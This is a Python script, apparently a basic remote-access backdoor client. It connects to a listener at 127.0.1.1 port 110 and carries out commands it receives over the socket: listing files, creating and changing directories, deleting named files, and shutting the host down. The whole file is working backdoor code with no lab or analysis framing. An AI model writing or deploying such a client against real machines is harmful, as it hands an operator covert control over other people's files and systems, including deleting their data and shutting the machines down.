import socket
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ip='127.0.1.1'
s.connect((ip,110))
while (1):
   data=s.recv(5000)
   data=data.decode()
   data=str(data)
   if data == 'use_cwd':
      cm = os.getcwd()
      s.send(cm.encode())
      print ('getting CWD....')
   elif data == 'use_ls':
      cm2 = os.listdir()
      cm2 = str(cm2)
      s.send(cm2.encode())
      print ('File listed')
   elif data=='use_shutdown':
      s.send('Turned Off,press "CTRL+C" to exit'.encode())
      os.system('shutdown')
   elif data=='use_mkd':
        rs='os.mkdir(nd) nd[?]:'
        rs=str(rs)
        s.send(rs.encode())
        mkd=s.recv(5000)
        mkd=mkd
        mkd = mkd.decode()
        os.mkdir(mkd)
        resu = 'Created successfully'
        s.send(resu.encode())
        print ('Directory %s  created successfully'%mkd)
   elif data=='use_cls':
      os.system('clear')
      ress='screen cleared.'
      s.send(ress.encode())
   elif data=='use_cd':
      dir='os.chdir(cd) cd[?]:'
      s.send(dir.encode())
      dirn=s.recv(5000)
      rs=os.chdir(dirn)
      rs=str(rs)
      s.send(rs.encode())
      print ('changed directory to %s'%(dirn.decode()))
   elif data=='use_rm':
      ls='os.remove(fl) fl[?]:'
      s.send(ls.encode())
      df=s.recv(5000)
      os.remove(df)
      rs='removed successfully'
      rs=str(rs)
      s.send(rs.encode())
      print ('File %s removed successfully'%(df.decode())) 
   elif data=='exit':
      a = 'Received, leaving'
      s.send(a.encode())
      print ('Leaving....')
      exit()
   elif data=='use_sp':
      s.send('print(vr),vr[?]:'.encode())
      rs =s.recv(5000)
      rs=rs.decode()
      rs=str(rs)
      print (rs) 
      s.send('[vr]printed successfully.'.encode())
   else:
      bkerror='Command not found ERROR,try adding new tools or typing other command'
      s.send(bkerror.encode())

